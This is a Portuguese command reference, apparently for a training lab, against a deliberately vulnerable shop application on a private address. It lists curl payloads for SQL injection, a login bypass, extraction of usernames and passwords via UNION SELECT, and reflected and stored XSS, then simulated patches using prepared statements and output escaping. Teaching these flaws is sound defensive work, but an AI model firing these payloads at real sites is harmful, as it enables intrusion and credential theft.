📖 Referência de Comandos

clear / cls - Limpar a tela do terminal
help - Listar comandos disponíveis
curl http://192.168.10.30/lojinha - Acessar a home da aplicação
curl ".../produto.php?id=1" - Ver página do produto
curl ".../produto.php?id=1'" - Testar SQL Injection (quebra a consulta)
curl -X POST -d "usuario=admin&senha=' OR '1'='1" .../login.php - Contornar login vulnerável
curl ".../produto.php?id=99 UNION SELECT 1,usuario,senha FROM usuarios" - Extrair dados via UNION
curl ".../busca.php?q=<script>alert('x')</script>" - Testar XSS refletido
curl -X POST -d "produto=1&comentario=<script>..." .../comentar.php - XSS armazenado
patch lojinha --prepared-statements - Corrigir SQL Injection
patch lojinha --escape-output - Corrigir XSS (escapar saída)
